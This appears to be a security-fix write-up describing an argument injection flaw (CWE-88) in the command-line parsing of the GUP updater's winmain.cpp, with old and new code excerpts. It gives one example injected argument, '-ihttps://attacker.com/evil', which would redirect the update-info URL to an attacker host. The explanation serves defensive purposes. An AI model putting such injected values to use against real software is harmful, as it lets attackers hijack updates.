## Security vulnerability fixed: **Argument Injection (CWE-88)**

The critical vulnerability is in **file_07** (`winmain.cpp`). The old `wWinMain` had:

```cpp
getParamVal('i', params, customInfoUrl);
getParamVal('d', params, forceDomain);
```

With `getParamVal` defined as:

```cpp
if (token[0] == '-' && lstrlen(token) >= 2 && token[1] == c)
{
    value = (token + 2);  // takes everything after "-i" or "-d"
    ...
}
```

This matches **any** parameter starting with `-i` or `-d` and takes everything after the first two characters as the flag's value. An attacker who can influence a GUP command-line argument (e.g., via a crafted plugin name, download URL, or other externally-derived argument) could inject something like `-ihttps://attacker.com/evil` which would be parsed as the `-i` flag with value `https://attacker.com/evil`, **redirecting the update-info URL to an attacker-controlled server**.

The new code replaces this with:

```cpp
getParamValFromString(FLAG_INFOURL, params, customInfoUrl);   // "-infoUrl="
getParamValFromString(FLAG_FORCEDOMAIN, params, forceDomain); // "-forceDomain="
```

`getParamValFromString` only matches parameters whose full prefix is `-infoUrl=` or `-forceDomain=`, preventing any ambiguous injection.
